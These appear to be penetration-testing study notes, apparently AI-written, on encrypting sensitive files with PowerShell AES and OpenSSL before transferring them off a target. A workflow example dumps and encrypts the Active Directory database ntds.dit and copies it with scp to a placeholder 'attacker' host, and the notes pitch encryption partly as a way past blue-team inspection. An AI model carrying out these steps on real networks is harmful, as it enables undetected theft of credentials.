#

---

## 🎯 Why Protect File Transfers?

During penetration tests, we often handle **highly sensitive data**, such as:

- NTDS.dit (Active Directory database)
    
- Credential dumps
    
- Hashes for offline cracking
    
- Enumeration data
    
- Internal infrastructure documentation
    
- Configuration backups
    

If intercepted, this data can cause:

- Legal consequences
    
- Client trust damage
    
- Regulatory violations
    
- Severe reputational harm
    

---

## ⚠️ Professional Responsibility Reminder

> Unless specifically requested by a client, we do not recommend exfiltrating data such as Personally Identifiable Information (PII), financial data, trade secrets, etc.

If testing Data Loss Prevention (DLP):

- Create **dummy files**
    
- Simulate real data formats
    
- Never extract real sensitive content without written approval
    

---

# 🔐 Secure Transport vs. Encryption at Rest

|Method|Protects In Transit|Protects At Rest|Example|
|---|---|---|---|
|SSH / SCP|✅|❌|`scp file user@IP:`|
|HTTPS|✅|❌|`curl https://...`|
|SFTP|✅|❌|`sftp user@IP`|
|File Encryption (AES)|❌|✅|`openssl enc`|

If secure transport is unavailable → **Encrypt first, then transfer**

---

# 🖥️ File Encryption on Windows

## 📜 Using Invoke-AESEncryption.ps1

A lightweight PowerShell AES-256 encryption script.

---

## 🔹 Step 1: Transfer Script to Target

Use any method previously covered:

- SMB
    
- HTTP
    
- Netcat
    
- WinRM
    
- Base64
    

---

## 🔹 Step 2: Import Module

```powershell
Import-Module .\Invoke-AESEncryption.ps1
```

---

## 🔹 Encrypt a File

```powershell
Invoke-AESEncryption -Mode Encrypt -Key "p4ssw0rd" -Path .\scan-results.txt
```

Output:

```
File encrypted to C:\htb\scan-results.txt.aes
```

Creates:

```
scan-results.txt.aes
```

---

## 🔹 Decrypt File

```powershell
Invoke-AESEncryption -Mode Decrypt -Key "p4ssw0rd" -Path .\scan-results.txt.aes
```

---

## 🔹 Encrypt Text (Base64 Output)

```powershell
Invoke-AESEncryption -Mode Encrypt -Key "p@ssw0rd" -Text "Secret Text"
```

---

## 🔹 Decrypt Text

```powershell
Invoke-AESEncryption -Mode Decrypt -Key "p@ssw0rd" -Text "Base64CipherText"
```

---

## 🔐 Important Security Notes

- Uses AES-256-CBC
    
- SHA256-derived key
    
- Random IV prepended
    
- Always use **strong, unique passwords**
    
- Never reuse passwords across engagements
    

---

# 🐧 File Encryption on Linux

## 🔑 Using OpenSSL (Common & Reliable)

OpenSSL is typically installed by default.

---

## 🔹 Encrypt a File

```bash
openssl enc -aes256 -iter 100000 -pbkdf2 -in /etc/passwd -out passwd.enc
```

You will be prompted for a password.

---

## 🔹 Decrypt File

```bash
openssl enc -d -aes256 -iter 100000 -pbkdf2 -in passwd.enc -out passwd
```

---

## 🔍 Explanation of Options

|Option|Purpose|
|---|---|
|`-aes256`|AES-256-CBC encryption|
|`-iter 100000`|Increases brute-force resistance|
|`-pbkdf2`|Secure password-based key derivation|
|`-d`|Decrypt mode|

---

## 🔐 Why Use -pbkdf2 and -iter?

Prevents:

- Fast brute-force attacks
    
- Rainbow table attacks
    
- Weak key derivation
    

---

# 🔁 Secure Workflow Example

1. Dump sensitive file
    
2. Encrypt locally
    
3. Transfer encrypted version
    
4. Decrypt only in safe environment
    

Example:

```bash
# Encrypt
openssl enc -aes256 -iter 100000 -pbkdf2 -in ntds.dit -out ntds.enc

# Transfer
scp ntds.enc user@attacker:

# Decrypt safely
openssl enc -d -aes256 -iter 100000 -pbkdf2 -in ntds.enc -out ntds.dit
```

---

# 🔐 Strong Password Guidelines

- Minimum 14+ characters
    
- Unique per engagement
    
- Use passphrases
    
- Store securely (password manager)
    
- Never hardcode in scripts
    

---

# 🧠 When to Encrypt Before Transfer

|Scenario|Encrypt?|
|---|---|
|Using raw Netcat|✅ Yes|
|Using HTTP|✅ Yes|
|Using FTP|✅ Yes|
|Using SMB (unencrypted)|✅ Yes|
|Using SSH/SCP|Optional but recommended|
|Using HTTPS|Optional but recommended|

---

# 🚨 Risks of Not Encrypting

- IDS capture
    
- Network sniffing
    
- Proxy logging
    
- Blue team packet inspection
    
- Legal liability
    
- Client contract violation
    

---

# 🛡️ Red Team Best Practices

✔ Always encrypt sensitive data  
✔ Use secure transport when possible  
✔ Rotate encryption passwords per client  
✔ Store encrypted archives only  
✔ Remove decrypted artifacts from target  
✔ Never exfiltrate real PII without authorization

---

# 🔑 Key Takeaways

- Secure transport is preferred (SSH, HTTPS)
    
- If unavailable → encrypt manually
    
- Windows → Invoke-AESEncryption
    
- Linux → OpenSSL with AES256 + PBKDF2
    
- Use strong unique passwords
    
- Maintain professional ethics
    

---

If you'd like, I can also create:

- 🔥 Ultra-compact exam cheat sheet
    
- 📊 Comparison table (All file transfer + encryption methods)
    
- 🧠 Decision flowchart
    
- 🛡️ Blue-team detection notes
    
- 📄 Printable PDF-style summary
    

Just tell me what you prefer.